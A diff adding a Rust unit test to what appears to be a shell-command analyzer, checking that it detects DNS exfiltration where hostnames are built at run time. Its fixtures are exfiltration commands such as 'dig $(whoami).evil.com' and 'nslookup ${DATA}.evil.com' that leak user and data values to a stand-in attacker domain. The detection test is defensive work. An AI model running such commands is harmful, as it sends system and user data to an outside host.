@@ -62,3 +62,28 @@ fn a_host_shaped_word_is_net_only_where_a_host_is_expected() {
         assert!(has_net(&parsed(command), host), "{command}");
     }
 }
+
+/// A name a resolver or client gets that the shell builds at run time still
+/// ends in its domain, where the lookup goes (DNS exfiltration); nothing after
+/// the last expansion, or no dotted host there, names none.
+#[test]
+fn a_host_built_at_run_time_names_its_fixed_domain() {
+    for line in [
+        "dig $(whoami).evil.com",
+        "dig \"$(id -u)-x.$(hostname).evil.com\"",
+        "nslookup ${DATA}.evil.com",
+        "host -t txt $CHUNK.evil.com",
+        "drill a-$(date +%s).evil.com",
+        "getent hosts `whoami`.evil.com",
+    ] {
+        let a = parsed(line);
+        assert!(has_net(&a, "evil.com"), "{line}: {a:?}");
+    }
+    for line in ["dig \"$DOMAIN\"", "dig $X.json", "echo $(whoami).evil.com"] {
+        let a = parsed(line);
+        assert!(
+            !a.iter().any(|x| matches!(x, AtomicAction::Net { .. })),
+            "{line}: {a:?}"
+        );
+    }
+}
